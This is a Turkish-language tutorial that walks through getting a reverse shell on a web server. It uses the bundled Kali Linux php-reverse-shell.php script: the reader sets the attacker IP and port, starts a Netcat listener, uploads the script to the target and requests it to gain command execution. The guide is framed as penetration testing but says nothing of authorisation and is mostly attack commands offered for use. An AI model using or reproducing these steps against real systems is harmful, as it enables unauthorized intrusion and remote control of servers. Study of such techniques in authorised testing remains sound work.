# Netcat ile Hazır PHP Reverse Shell Kullanımı

Bu rehberde, Kali Linux gibi sızma testi dağıtımlarında bulunan **hazır PHP reverse shell betiği** (`/usr/share/webshells/php/php-reverse-shell.php`) kullanarak Netcat ile bir reverse shell'i nasıl kuracağınızı ve kullanacağınızı kısa ve net adımlarla anlatacağım.

---

## Adım 1: Hazır PHP Reverse Shell Betiğini Düzenleme

Öncelikle, saldırgan makinenizdeki hazır PHP reverse shell betiğini kendi IP adresiniz ve dinleyeceğiniz port numarasıyla düzenlemeniz gerekiyor.

1.  **Betiği Kopyalayın:** Orijinal dosyayı doğrudan düzenlemek yerine, daha güvenli bir şekilde çalışmak için önce onu kendi çalışma dizininize kopyalayın:

    "cp /usr/share/webshells/php/php-reverse-shell.php ~/reverse_shell.php"

2.  **Betiği Düzenleyin:** Kopyaladığınız `~/reverse_shell.php` dosyasını bir metin düzenleyiciyle açın (örneğin, `nano` veya `gedit`):

    `nano ~/reverse_shell.php`

    Dosyanın içinde aşağıdaki satırları bulun:

    ```php
    $ip = '10.0.0.1';  // CHANGE THIS
    $port = 1234;       // CHANGE THIS
    ```

    * `'10.0.0.1'` yerine kendi **saldırgan makinenizin IP adresini** yazın.
    * `1234` yerine **dinleyici olarak kullanacağınız port numarasını** yazın (örneğin, `4444`).

    Değişiklikleri kaydedin ve dosyayı kapatın.

---

## Adım 2: Dinleyiciyi (Listener) Ayarlama (Saldırgan Makine)

Düzenlediğiniz betikte belirttiğiniz port numarasını dinlemek için saldırgan makinenizde bir Netcat dinleyicisi başlatın:

"nc -lvnp 4444"

* **`nc`**: Netcat.
* **`-l`**: Dinleme modunu açar.
* **`-v`**: Ayrıntılı çıktı verir.
* **`-n`**: DNS çözümlemesi yapmaz.
* **`-p 4444`**: 4444 numaralı portu dinler.

Bu komutu çalıştırdıktan sonra Netcat, hedef sistemden bağlantı gelmesini bekleyecektir.

---

## Adım 3: PHP Betiğini Çalıştırma (Hedef Makinede)

Düzenlediğiniz `reverse_shell.php` dosyasını hedef web sunucusunun erişebileceği bir dizine yüklemeniz gerekiyor.

Yükledikten sonra, hedef makinedeki web sunucusunda bu dosyaya tarayıcı üzerinden veya `curl` gibi bir araçla erişmeniz yeterlidir:

"http://<hedef_IP_adresi>/reverse_shell.php"

Bu adresi tarayıcınızda açtığınızda veya `curl` ile istek gönderdiğinizde, PHP betiği çalışacak ve saldırgan makinenizdeki Netcat dinleyicinize bir bağlantı kurmaya çalışacaktır.

---

## Sonuç

Eğer her şey doğru ayarlandıysa, saldırgan makinenizdeki Netcat terminalinde bir bağlantı açıldığını göreceksiniz. Bu noktadan itibaren, hedef sistem üzerinde komut çalıştırmaya başlayabileceksiniz.
